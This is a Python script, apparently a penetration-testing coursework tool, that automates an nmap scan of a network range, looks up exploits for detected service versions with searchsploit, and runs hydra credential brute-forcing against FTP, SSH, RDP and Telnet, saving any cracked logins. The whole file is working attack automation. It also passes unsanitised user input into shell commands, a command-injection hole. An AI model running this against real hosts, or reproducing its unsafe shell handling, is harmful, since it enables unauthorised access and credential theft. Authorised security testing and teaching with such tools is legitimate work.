import re
import os
import subprocess
import sys
import zipfile
import time
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# List of tools required for the script to run properly
required_tools = {
    "nmap": "nmap",  # For network scanning and service detection
    "searchsploit": "exploitdb",  # For vulnerability assessment based on detected service versions
    "hydra": "hydra",  # For brute-force attacks on services like SSH, FTP, RDP, and Telnet
    "pip": "python3-pip",  # For Python package management
}

# Python packages required for colored output
required_python_packages = ["colorama"]

# Default file paths for username and password lists
default_username_list = "/home/kali/PenTesting/PenTestingProject/top-usernames-shortlist.txt"
default_password_list = "/home/kali/PenTesting/PenTestingProject/default-basic-14-passwords.txt"

# Function to print the current status of the script to the user
def log_status(message, color=Fore.BLUE):
    print(Style.BRIGHT + color + f"[STATUS]: {message}")

# Function to check if a tool is installed by attempting to run it with a version flag
def is_tool_installed(tool_name):
    """Check if a tool is installed by trying to run it with --version or equivalent."""
    try:
        subprocess.run([tool_name, "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return True
    except FileNotFoundError:
        return False

# Function to check the status of all required tools and inform the user
def check_tools_status():
    log_status("Checking installed tools...")
    for tool, package in required_tools.items():
        if is_tool_installed(tool):
            print(Fore.GREEN + f"{tool} is installed.")
        else:
            print(Fore.RED + f"{tool} is not installed.")

# Function to install and update necessary tools using apt-get and pip
def install_and_update_tools():
    missing_tools = []
    missing_python_packages = []

    # Check for missing system tools and add them to the list for installation
    for tool, package in required_tools.items():
        if not is_tool_installed(tool):
            missing_tools.append(package)
    
    # If there are missing system tools, install them using the package manager
    if missing_tools:
        log_status(f"The following tools are missing and will be installed: {', '.join(missing_tools)}", color=Fore.YELLOW)
        try:
            subprocess.run(["sudo", "apt-get", "update"], check=True)  # Update package list
            subprocess.run(["sudo", "apt-get", "install", "-y"] + missing_tools, check=True)  # Install missing tools
            print(Fore.GREEN + "System tool installation complete.")
        except subprocess.CalledProcessError:
            print(Fore.RED + "Error: Failed to install necessary system tools.")
            sys.exit(1)
    else:
        log_status("All necessary system tools are already installed.", color=Fore.GREEN)

    # Check for missing Python packages and add them to the list for installation
    for package in required_python_packages:
        try:
            __import__(package)  # Check if the package can be imported
        except ImportError:
            missing_python_packages.append(package)
    
    # If there are missing Python packages, install them using pip
    if missing_python_packages:
        log_status(f"The following Python packages are missing and will be installed: {', '.join(missing_python_packages)}", color=Fore.YELLOW)
        try:
            subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "pip"], check=True)  # Ensure pip is up to date
            subprocess.run([sys.executable, "-m", "pip", "install"] + missing_python_packages, check=True)  # Install missing packages
            print(Fore.GREEN + "Python package installation complete.")
        except subprocess.CalledProcessError:
            print(Fore.RED + "Error: Failed to install necessary Python packages.")
            sys.exit(1)
    else:
        log_status("All necessary Python packages are already installed.", color=Fore.GREEN)

# Function to get user input for the network range to scan
def get_network_input():
    network = input("Enter the network range to scan (e.g., 192.168.15.0/24): ")
    # Validate the network format using regex
    if re.match(r"^\d{1,3}(\.\d{1,3}){3}/\d{1,2}$", network):
        return network
    else:
        print(Fore.RED + "Invalid network format. Please try again.")
        return get_network_input()

# Function to get the directory where the output should be saved
def get_output_directory():
    choice = input("Do you want to save the output in the current directory? (yes/no): ").lower()
    if choice == 'yes':
        directory = os.getcwd() #Get the current working directory
        log_status(f"Saving output to the current directory: {directory}")
    elif choice == 'no':
        directory = input("Enter the directory to save the output: ")
        if not os.path.exists(directory):  # Create the directory if it doesn't exist
            os.makedirs(directory)
            log_status(f"Directory created: {directory}")
    else:
        print(Fore.RED + "Invalid choice. Please choose 'yes' or 'no'.")
        return get_output_directory()
    return directory

# Function to ask the user which type of scan they want to perform (Basic or Full)
def get_scan_type():
    scan_type = input("Choose scan type (Basic/Full): ").lower()
    if scan_type in ['basic', 'full']:
        return scan_type
    else:
        print(Fore.RED + "Invalid choice. Please choose either 'Basic' or 'Full'.")
        return get_scan_type()

# Function to perform a TCP scan using Nmap and save the results
def perform_tcp_scan(network_range, output_directory):
    output_file = os.path.join(output_directory, "tcp_scan_results.txt")
    scan_command = f"nmap -sS -sV {network_range} -oN {output_file}"  # Nmap command for TCP scan with service detection
    log_status("Performing TCP scan, this may take a while...", color=Fore.YELLOW)
    
    # Execute the scan command
    subprocess.run(scan_command, shell=True)
    
    log_status(f"TCP scan complete. Results saved to {output_file}", color=Fore.GREEN)
    return output_file

# Function to extract service ports from Nmap results
def extract_service_ports(output_file):
    service_ports = {}
    with open(output_file, 'r') as scan_results:
        lines = scan_results.readlines()
        for line in lines:
            match = re.search(r"(\d{1,5}/tcp)\s+open\s+(\S+)", line)
            if match:
                port = match.group(1).split('/')[0]  # Extract the port number
                service_name = match.group(2).lower()  # Normalize service name to lowercase
                service_ports[service_name] = port
    return service_ports

# Function to perform vulnerability mapping using Searchsploit and append results to the scan file
def perform_vulnerability_mapping(output_file):
    log_status("Starting vulnerability mapping...", color=Fore.YELLOW)
    vulnerable_services = set()  # Use a set to track unique service/port pairs
    
    with open(output_file, 'a') as file:  # Open the file in append mode
        file.write("\n\n--- Vulnerability Assessment Results ---\n\n")
        with open(output_file, 'r') as scan_results:
            lines = scan_results.readlines()
            for line in lines:  # Loop through the Nmap results to find services and versions
                match = re.search(r"(\d{1,5}/tcp)\s+open\s+(\S+)\s+(.*)", line)
                if match:
                    port = match.group(1)
                    service_name = match.group(2)
                    version = match.group(3).strip()

                    # Check if the service/port pair is already added
                    if (service_name, port) not in vulnerable_services:
                        file.write(f"\nChecking vulnerabilities for {service_name} {version} on {port}...\n")
                        
                        # Use Searchsploit to find vulnerabilities related to the service version
                        command = f"searchsploit {version}"
                        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                        stdout, stderr = process.communicate()

                        if stdout.strip():  # Only write results if something was found
                            file.write(stdout.decode())
                            vulnerable_services.add((service_name, port))  # Add to the set of vulnerable services
    
    return list(vulnerable_services)  # Convert the set back to a list for further processing

# Function to get user input for username and password lists (either default or custom)
def get_username_password_list():
    choice = input("Do you want to use the default username and password lists? (yes/no): ").lower()
    if choice == 'yes':
        return default_username_list, default_password_list
    elif choice == 'no':
        username_list = input("Enter the path to your custom username list: ")
        password_list = input("Enter the path to your custom password list: ")
        if os.path.exists(username_list) and os.path.exists(password_list):  # Check if the files exist
            return username_list, password_list
        else:
            print(Fore.RED + "File not found. Please enter valid paths.")
            return get_username_password_list()
    else:
        print(Fore.RED + "Invalid choice. Please choose 'yes' or 'no'.")
        return get_username_password_list()

# Function to get user input for which services to target for brute-force attacks
def get_service_selection():
    service_selection = input(f"Choose services to attack (FTP/SSH/RDP/Telnet/all): ").lower()
    allowed_services = ['ftp', 'ssh', 'rdp', 'telnet']
    
    if service_selection == 'all':
        return allowed_services  # If "all" is selected, return all services
    else:
        selected_services = service_selection.split(',')  # Split the input into a list
        for service in selected_services:
            if service.strip() not in allowed_services:  # Check if the service is allowed
                print(Fore.RED + f"Invalid service selected: {service}. Please choose from FTP, SSH, RDP, or Telnet.")
                return get_service_selection()
        return [service.strip() for service in selected_services]  # Return the list of selected services

# Function to filter only relevant services for brute-forcing
def filter_relevant_services(vulnerable_services, relevant_services):
    """Filter the services that are relevant for brute-forcing."""
    filtered_services = []
    for service_name, port in vulnerable_services:
        if service_name.lower() in relevant_services:
            filtered_services.append((service_name, port))
        else:
            log_status(f"Skipping irrelevant service: {service_name} on port {port}.", color=Fore.YELLOW)
    return filtered_services

# Function to perform brute-force attacks using Hydra on vulnerable services
def brute_force_vulnerable_services(vulnerable_services, target_ip, username_list, password_list, selected_services, service_ports, output_file):
    if not vulnerable_services:
        log_status("No vulnerable services found. Skipping brute-force attempts.", color=Fore.YELLOW)
        return
    
    # Filter to include only relevant services (FTP, SSH, Telnet, RDP)
    relevant_services = ["ftp", "ssh", "telnet", "rdp"]
    filtered_services = filter_relevant_services(vulnerable_services, relevant_services)
    
    if not filtered_services:
        log_status("No relevant services found for brute-forcing.", color=Fore.YELLOW)
        return
    
    log_status(f"Filtered services for brute-forcing: {filtered_services}", color=Fore.BLUE)
    
    attempted_services = set()

    for service_name, port in filtered_services:
        service_name = service_name.lower()
        port_number = port.split('/')[0]

        if service_name in selected_services and (service_name, port_number) not in attempted_services:
            log_status(f"Attempting to brute-force {service_name} on port {port_number}.", color=Fore.CYAN)

            command = f"hydra -vV -L {username_list} -P {password_list} {target_ip} {service_name} -s {port_number}"
            log_status(f"Running brute-force attack with command: {command}", color=Fore.YELLOW)
            
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = process.communicate()
            result_output = stdout.decode()

            # Log the output from Hydra to help diagnose any issues
            log_status(f"Hydra Output:\n{result_output}", color=Fore.CYAN)

            # Check for successful attempts and write them to the output file
            with open(output_file, 'a') as file:
                if "login:" in result_output or "password:" in result_output:  # Check for success keywords in the output
                    file.write(f"\nSuccessful brute-force attempt on {service_name} at port {port_number}:\n")
                    file.write(result_output)
                    log_status(f"Successful brute-force attempt on {service_name} at port {port_number}.", color=Fore.GREEN)
                else:
                    log_status(f"No successful attempts for {service_name} on port {port_number}.", color=Fore.RED)
            
            if process.returncode != 0:  # Check for errors in the Hydra command
                log_status(f"Hydra command failed with return code {process.returncode}.", color=Fore.RED)
            else:
                log_status(f"Brute-force attack on {service_name} completed successfully.", color=Fore.GREEN)
            
            attempted_services.add((service_name, port_number))
        else:
            log_status(f"Service {service_name} on port {port_number} is either not selected or has already been attempted. Skipping.", color=Fore.YELLOW)

# Ensure that this line is logged if brute-forcing is skipped or not initiated
log_status("Brute-force attack process completed.", color=Fore.GREEN)

# Function to allow users to search within results using grep
def search_results_with_grep(output_file):
    search_term = input(Fore.BLUE + "Enter the term you want to search for in the results: ")
    command = f"grep -i '{search_term}' {output_file}"  # Construct the grep command
    os.system(command)  # Execute the grep command to search within the file

# Function to open results in a code editor (Geany)
def open_results_in_editor(output_file):
    choice = input(Fore.BLUE + "Do you want to open the results in Geany for manual searching? (yes/no): ").lower()
    if choice == 'yes':
        os.system(f"geany {output_file} &")  # Open the file in Geany editor
    elif choice != 'no':
        log_status("Invalid choice. Please choose 'yes' or 'no'.", color=Fore.RED)
        open_results_in_editor(output_file)

# Function to zip all results
def zip_results(output_directory):
    choice = input(Fore.BLUE + "Do you want to zip all results into a single file? (yes/no): ").lower()
    if choice == 'yes':
        zip_filename = os.path.join(output_directory, "scan_results.zip")
        with zipfile.ZipFile(zip_filename, 'w') as zipf:
            for root, _, files in os.walk(output_directory):
                for file in files:
                    if file.endswith(".txt"):  # Add only .txt files to the zip archive
                        zipf.write(os.path.join(root, file), file)
        log_status(f"All results have been zipped into {zip_filename}", color=Fore.GREEN)
    elif choice != 'no':
        log_status("Invalid choice. Please choose 'yes' or 'no'.", color=Fore.RED)
        zip_results(output_directory)

# Main function to run the script
def main():
    # List and check tools' status
    check_tools_status()
    
    # Ensure necessary tools are installed and updated
    install_and_update_tools()
    
    network_range = get_network_input()  # Get network range from the user
    output_directory = get_output_directory()  # Get the directory to save the results
    scan_type = get_scan_type()  # Get scan type (Basic or Full)

    log_status("Starting the scan process...", color=Fore.BLUE)

    tcp_results = perform_tcp_scan(network_range, output_directory)  # Perform the TCP scan

    # Extract the service ports dynamically from the scan results
    service_ports = extract_service_ports(tcp_results)

    vulnerable_services = []
    if scan_type == "full":  # Only perform vulnerability mapping in Full scan
        vulnerable_services = perform_vulnerability_mapping(tcp_results)
    
    log_status("Finished scanning and vulnerability mapping.", color=Fore.GREEN)

    # Get username and password lists
    username_list, password_list = get_username_password_list()

    # Get user-selected services
    selected_services = get_service_selection()
    
    # Perform brute-force attacks on vulnerable services
    if vulnerable_services:
        target_ip = input(Fore.BLUE + "Enter the IP address for brute-force attacks: ")
        brute_force_vulnerable_services(vulnerable_services, target_ip, username_list, password_list, selected_services, service_ports, tcp_results)

    log_status("Brute-force attack process completed.", color=Fore.GREEN)

    # Allow user to search results
    search_results_with_grep(tcp_results)
    
    # Optionally open the results in Geany
    open_results_in_editor(tcp_results)

    # Optionally zip all results
    zip_results(output_directory)

if __name__ == "__main__":
    main()
